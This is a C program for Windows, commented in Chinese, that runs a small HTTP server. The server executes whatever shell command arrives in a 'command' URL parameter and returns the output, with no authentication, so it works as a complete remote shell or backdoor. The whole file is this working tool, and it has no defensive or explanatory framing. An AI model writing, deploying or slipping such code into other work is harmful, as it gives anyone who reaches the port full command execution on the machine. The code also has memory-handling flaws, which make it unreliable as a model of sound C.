#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <wchar.h>
#include <stdbool.h>

#define Command_Text "command"
#pragma comment(lib, "ws2_32.lib")

char* ANSIToUTF8(const char* str) {
	int wideLength = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
	if (wideLength == 0) {
		// 转换失败，返回空指针或者进行适当的错误处理
		return NULL;
	}

	wchar_t* wideBuffer = (wchar_t*)malloc(wideLength * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, -1, wideBuffer, wideLength);

	int utf8Length = WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, NULL, 0, NULL, NULL);
	if (utf8Length == 0) {
		// 转换失败，释放内存并返回空指针或者进行适当的错误处理
		free(wideBuffer);
		return NULL;
	}

	char* utf8Buffer = (char*)malloc(utf8Length * sizeof(char));
	WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, utf8Buffer, utf8Length, NULL, NULL);

	free(wideBuffer);

	return utf8Buffer;
}

char* Utf8ToAnsi(const char* utf8Str) {
	int length = MultiByteToWideChar(CP_UTF8, 0, utf8Str, -1, NULL, 0);
	if (length == 0) {
		return NULL;
	}

	wchar_t* wideStr = (wchar_t*)malloc(length * sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, utf8Str, -1, wideStr, length);

	length = WideCharToMultiByte(CP_ACP, 0, wideStr, -1, NULL, 0, NULL, NULL);
	if (length == 0) {
		free(wideStr);
		return NULL;
	}

	char* ansiStr = (char*)malloc(length * sizeof(char));
	WideCharToMultiByte(CP_ACP, 0, wideStr, -1, ansiStr, length, NULL, NULL);

	free(wideStr);

	return ansiStr;
}


char* url_decode(const char* str) {
	int len = strlen(str);
	char* result = (char*)malloc((len + 1) * sizeof(char));
	int i = 0, j = 0;

	while (i < len) {
		if (str[i] == '%') {
			sscanf(str + i + 1, "%2hhx", &result[j]);
			i += 3;
		} else if (str[i] == '+') {
			result[j] = ' ';
			i++;
		} else {
			result[j] = str[i];
			i++;
		}
		j++;
	}

	result[j] = '\0';
	return result;
}

char* getCmdResult(const char* strCmd) {
	FILE* pf = NULL;
	if ((pf = _popen(strCmd, "r")) == NULL) {
		return "";
	}
	char buf[2048];
	char* strResult = (char*)malloc(1);
	strResult[0] = '\0';
	while (fgets(buf, sizeof(buf), pf)) {
		strResult = realloc(strResult, strlen(strResult) + strlen(buf) + 1);
		strcat(strResult, buf);
	}
	_pclose(pf);
	unsigned int iSize = strlen(strResult);
	if (iSize > 0 && strResult[iSize - 1] == '\n') {
		strResult[iSize - 1] = '\0';
	}
	return strResult;
}

char* build_data(const char* res) {
	int length = strlen(res);
	char lengthStr[16];
	sprintf(lengthStr, "%d", length);

	char* result = (char*)malloc((length + 1024) * sizeof(char));
	strcpy(result, "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: ");
	strcat(result, lengthStr);
	strcat(result, "\r\n\r\n");
	strcat(result, res);

	return result;
}

char* GetFirstLine(const char* str) {
	if (str == NULL) {
		return "";
	}

	char* result = (char*)malloc(4096 * sizeof(char));
	int j = 0;
	for (int i = 0; str[i] != '\0'; i++) {
		if (str[i] == '\n') {
			break;
		}
		result[j++] = str[i];
	}
	result[j] = '\0';

	return result;
}

char* extractSubstring(const char* text, const char* startText, const char* endText) {
	int startIndex = strstr(text, startText) - text;
	int endIndex = strstr(text, endText) - text;

	if (startIndex != -1 && endIndex != -1) {
		startIndex += strlen(startText);
		char* result = (char*)malloc((endIndex - startIndex + 1) * sizeof(char));
		strncpy(result, text + startIndex, endIndex - startIndex);
		result[endIndex - startIndex] = '\0';
		return result;
	} else {
		return "";
	}
}

char* getParamValue(const char* url, const char* param) {
	char* paramPos = strstr(url, param);
	if (paramPos == NULL) {
		return ""; // 如果未找到参数，则返回空字符串
	}

	int valuePos = paramPos - url + strlen(param) + 1; // 参数值的起始位置
	char* ampPos = strchr(url + valuePos, '&');         // 下一个参数的起始位置

	if (ampPos == NULL) {
		return url + valuePos; // 如果没有下一个参数，则截取到字符串末尾
	} else {
		char* result = (char*)malloc((ampPos - url - valuePos + 1) * sizeof(char));
		strncpy(result, url + valuePos, ampPos - url - valuePos);
		result[ampPos - url - valuePos] = '\0';
		return result;
	}
}

void ChangeCurrentDirectory(const char* path);

int main(int argc, char *argv[]) {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		fprintf(stderr, "Failed to initialize winsock.\n");
		return 1;
	}

	// 创建套接字
	SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (serverSocket == INVALID_SOCKET) {
		fprintf(stderr, "Failed to create socket.\n");
		WSACleanup();
		return 1;
	}

	// 设置服务器地址和端口
	struct sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = INADDR_ANY;
	serverAddress.sin_port = htons(atoi(argv[1]));


	// 绑定套接字
	if (bind(serverSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
		fprintf(stderr, "Failed to bind socket.\n");
		closesocket(serverSocket);
		WSACleanup();
		return 1;
	}

	// 开始监听
	if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
		fprintf(stderr, "Failed to start listening.\n");
		closesocket(serverSocket);
		WSACleanup();
		return 1;
	}

	printf("Server started. Listening on port %d...\n",atoi(argv[1]));

	while (1) {
		// 接受客户端连接
		SOCKET clientSocket = accept(serverSocket, NULL, NULL);
		if (clientSocket == INVALID_SOCKET) {
			fprintf(stderr, "Failed to accept client connection.\n");
			closesocket(serverSocket);
			WSACleanup();
			return 1;
		}

		char buffer[4096];
		memset(buffer, 0, sizeof(buffer));

		// 接收数据
		int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
		if (strstr(GetFirstLine(buffer), "GET /favicon.ico") != NULL) continue;
		if (bytesRead > 0) {
			char* url = extractSubstring(GetFirstLine(buffer), "GET ", " HTTP/");
			char* CMD = getParamValue(url, Command_Text);
			CMD = url_decode(CMD);
			CMD = Utf8ToAnsi(CMD);
			printf("用户输入的命令为：%s\n", CMD);
			if (CMD[0] == 'c' && CMD[1] == 'd') { // 用户输入了cd命令，那么就需要切换运行目录了
				ChangeCurrentDirectory(CMD + 3);
			}
			char* temp = build_data(getCmdResult(CMD));
			send(clientSocket, ANSIToUTF8(temp), strlen(ANSIToUTF8(temp)), 0);
			free(temp);
		}

		// 关闭客户端套接字
		closesocket(clientSocket);
	}

	// 关闭服务器套接字
	closesocket(serverSocket);
	WSACleanup();

	return 0;
}

void ChangeCurrentDirectory(const char* path) {
	SetCurrentDirectory(path);
}

